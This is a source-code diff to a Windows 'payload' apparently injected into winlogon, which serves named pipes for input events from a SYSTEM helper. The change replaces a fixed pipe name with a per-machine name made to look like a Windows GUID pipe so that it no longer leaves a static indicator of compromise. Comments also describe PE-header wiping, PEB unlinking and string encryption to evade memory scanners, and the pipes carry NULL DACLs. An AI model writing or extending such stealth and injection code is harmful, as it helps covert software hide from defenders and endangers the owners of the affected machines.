@@ -21,6 +21,7 @@
 
 #include "../../shared/common.h"
 #include "../../shared/config_types.h"
+#include "../../shared/obf_names.h"   /* v3.0.2.4 (2026-09-21) -- GUID-per-install names */
 #include "rawinput_hook.h"
 #include "config_read.h"   /* v1.7.11.18: cfg_get() for scroll_step_px */
 
@@ -2627,31 +2628,18 @@ static DWORD WINAPI seb_repeat_thread_fn(LPVOID unused) {
 static volatile LONG g_seb_pipe_running = 0;
 static HANDLE        g_seb_pipe_thread  = NULL;
 
-/* v3.0.2 (2026-09-21) -- innocuous pipe name (matches wl_input.c after
- * XOR-decrypt). Kept as a plain wide literal here because the payload's
- * own image bytes are already PE-header-wiped + section-downgraded +
- * PEB-unlinked, and static strings live in the .rdata section which is
- * PAGE_READONLY MEM_PRIVATE post-init -- a memory scanner would find
- * this string as easily as anything else in .rdata, so per-string
- * obfuscation would be cosmetic. If tighter stealth is needed later,
- * migrate to the SS(SVC_STR_*)  encrypted-string mechanism. */
-#define SVC_PIPE_NAME_W  L"\\\\.\\pipe\\NetSvcCoord"
+/* v3.0.2.4 (2026-09-21) -- iso-desktop pipe name is now derived per-install
+ * via obf_pipe_iso() (SHA256 of MachineGuid + salt -> canonical GUID
+ * "\\.\pipe\<guid>", same treatment as the Default-desktop pipes). No
+ * more static "NetSvcCoord" IOC visible to a non-admin \\.\pipe\* enum.
+ * The name is different on every machine and looks like a Windows/COM
+ * GUID pipe. See shared/obf_names.c SALT_PIPE_ISO. */
 
-/* v3.0.2.1 (2026-09-21) -- LEGACY DRAIN PIPE.
- * The pre-v3.0.2 helper (LoadLibrary'd via host_inject.exe during
- * development) writes to \\.\pipe\svcldb_seb_input. If a stale old
- * helper is still resident in winlogon when we upgrade, its reader
- * gets stuck in blocking wire_send / connect_pipe retries against the
- * (no-longer-existent) old pipe. Its msg loop never returns to
- * WM_TIMER, so it never sees the halt event, so it never exits.
- *
- * Fix: this payload ALSO listens on the legacy pipe name and silently
- * drops every event received there. Stale readers connect + write
- * successfully, msg loop unblocks, WM_TIMER fires, superseded() returns
- * TRUE, reader exits cleanly. Safe to remove once we're confident no
- * pre-v3.0.2 helpers remain in the wild (post-first-reboot after
- * v3.0.2 ships). */
-#define SVC_LEGACY_PIPE_NAME_W  L"\\\\.\\pipe\\svcldb_seb_input"
+/* Legacy drain pipe name -- kept static because it MUST match the exact
+ * name the pre-v3.0.2 helper writes to (svcldb_seb_input). Only used to
+ * unblock stuck old-generation helpers so they can exit cleanly; ok to
+ * remove once we're confident no such helpers remain in the wild. */
+#define SVC_LEGACY_PIPE_NAME_A  "\\\\.\\pipe\\svcldb_seb_input"
 static volatile LONG g_legacy_drain_running = 0;
 static HANDLE        g_legacy_drain_thread  = NULL;
 static DWORD WINAPI legacy_drain_thread_fn(LPVOID unused) {
@@ -2662,7 +2650,7 @@ static DWORD WINAPI legacy_drain_thread_fn(LPVOID unused) {
         SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
         SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa);
         sa.lpSecurityDescriptor = &sd; sa.bInheritHandle = FALSE;
-        HANDLE pipe = CreateNamedPipeW(SVC_LEGACY_PIPE_NAME_W,
+        HANDLE pipe = CreateNamedPipeA(SVC_LEGACY_PIPE_NAME_A,
                                        PIPE_ACCESS_INBOUND,
                                        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                        PIPE_UNLIMITED_INSTANCES,
@@ -2696,7 +2684,7 @@ static DWORD WINAPI seb_pipe_server_thread(LPVOID unused) {
         InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
         SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);   /* NULL DACL: SYSTEM helper can connect */
         SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = &sd; sa.bInheritHandle = FALSE;
-        HANDLE pipe = CreateNamedPipeW(SVC_PIPE_NAME_W,
+        HANDLE pipe = CreateNamedPipeA(obf_pipe_iso(),
                                        PIPE_ACCESS_INBOUND,
                                        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                        1, 0, (DWORD)sizeof(seb_evt) * 32, 0, &sa);
@@ -2750,9 +2738,9 @@ void rawin_stop_seb_pipe(void) {
     InterlockedExchange(&g_seb_repeat_running, 0);
     InterlockedExchange(&g_legacy_drain_running, 0);
     /* Poke both pipes to wake any blocked Connect/Read. */
-    HANDLE poke = CreateFileW(SVC_PIPE_NAME_W, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE poke = CreateFileA(obf_pipe_iso(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     if (poke != INVALID_HANDLE_VALUE) CloseHandle(poke);
-    HANDLE poke2 = CreateFileW(SVC_LEGACY_PIPE_NAME_W, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE poke2 = CreateFileA(SVC_LEGACY_PIPE_NAME_A, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     if (poke2 != INVALID_HANDLE_VALUE) CloseHandle(poke2);
     if (g_seb_pipe_thread) { WaitForSingleObject(g_seb_pipe_thread, 1500); CloseHandle(g_seb_pipe_thread); g_seb_pipe_thread = NULL; }
     if (g_seb_repeat_thread) { WaitForSingleObject(g_seb_repeat_thread, 500); CloseHandle(g_seb_repeat_thread); g_seb_repeat_thread = NULL; }
